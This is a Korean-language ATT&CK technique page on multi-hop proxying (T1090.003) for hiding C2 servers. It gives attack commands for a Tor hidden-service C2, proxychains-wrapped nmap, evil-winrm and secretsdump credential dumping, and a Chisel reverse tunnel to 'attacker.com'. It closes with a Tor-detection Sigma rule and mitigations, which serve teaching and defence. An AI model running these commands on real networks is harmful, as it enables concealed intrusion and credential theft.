# T1090.003 — Multi-hop Proxy

## 개요

**TA0011 / T1090.003**  
여러 프록시를 경유하여 C2 서버의 실제 IP 주소를 은닉하는 기법입니다. Tor 네트워크, VPN 체인, SOCKS5 프록시를 중첩 사용하여 공격자의 인프라 추적을 어렵게 만듭니다.

---

## 동작 방식

1. 공격자가 여러 단계의 프록시 체인 구성
2. 피해 시스템의 트래픽이 여러 중간 노드를 경유
3. 최종 목적지에서 실제 출발지 IP 은닉
4. 포렌식 조사 시 경로 역추적 매우 어려움

**주요 프록시 기법:**
- Tor 네트워크 (Onion Routing)
- VPN 체인 (여러 VPN 중첩)
- SOCKS5 프록시 체인
- Chisel/Ligolo 같은 역방향 터널 도구

---

## 주요 커맨드 / 실습

### Tor 숨겨진 서비스 설정
```bash
# Tor 설치
apt install tor -y

# /etc/tor/torrc 설정 (Hidden Service C2)
cat >> /etc/tor/torrc << EOF
HiddenServiceDir /var/lib/tor/c2_service/
HiddenServicePort 80 127.0.0.1:8080
EOF

# Tor 서비스 시작
systemctl start tor
systemctl enable tor

# Hidden Service 주소 확인
cat /var/lib/tor/c2_service/hostname
# xxxxxxxxxxxxx.onion
```

### proxychains 설정 및 활용
```bash
# /etc/proxychains4.conf 설정
cat > /etc/proxychains4.conf << EOF
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1 1080   # Chisel/SSH SOCKS
socks5  10.0.0.5  9050   # Tor
EOF

# proxychains로 도구 실행 (내부망 접근)
proxychains nmap -sT -p 22,80,443,3389 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.10 -u administrator -p 'Password123!'
proxychains python3 secretsdump.py administrator:'pass'@10.0.0.10
proxychains curl http://internal-server/
```

### Chisel SOCKS5 터널
```bash
# 공격자 서버에서 Chisel 서버 실행 (역방향 SOCKS)
chisel server --port 8080 --reverse --socks5

# 피해 내부망 시스템에서 클라이언트 실행
chisel client attacker.com:8080 R:socks

# 내부망 → 피해망 → 공격자 서버 SOCKS5 터널 완성
# proxychains 설정: socks5 127.0.0.1 1080
```

### SSH 다중 홉 프록시
```bash
# 2단계 SSH 프록시 체인
ssh -J jumphost1,jumphost2 final-target

# 동적 SOCKS를 통한 다중 홉
ssh -D 1080 user@hop1 -o ProxyCommand="ssh -W %h:%p user@hop0"

# ProxyJump 설정 (~/.ssh/config)
cat >> ~/.ssh/config << EOF
Host final-target
    Hostname 10.0.0.5
    User admin
    ProxyJump hop1,hop2
    IdentityFile ~/.ssh/id_rsa
EOF
```

## 탐지 방법

### Sigma Rule
```yaml
title: Tor Client Execution
id: e8a5c2f3-7b4d-4e9b-a1c6-3f2d8e5b7a4c
status: stable
description: Detects execution of Tor browser or Tor daemon on Windows systems
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\tor.exe'
            - '\tor-browser.exe'
        CommandLine|contains:
            - 'tor'
    condition: selection
falsepositives:
    - Security researchers
    - Legitimate Tor usage for privacy
level: high
tags:
    - attack.command_and_control
    - attack.t1090.003
```

## 대응 방안

1. Tor 출구 노드 IP 목록 차단 (방화벽/웹 프록시)
2. 비표준 포트 아웃바운드 트래픽 차단 및 로깅
3. 트래픽 암호화 패턴 분석 (DPI - Deep Packet Inspection)
4. DNS-over-HTTPS 모니터링 (Tor/프록시 우회 탐지)
5. 엔드포인트에서 tor.exe 실행 탐지 및 차단
6. 허가된 프록시만 사용하도록 강제 (PAC 파일)
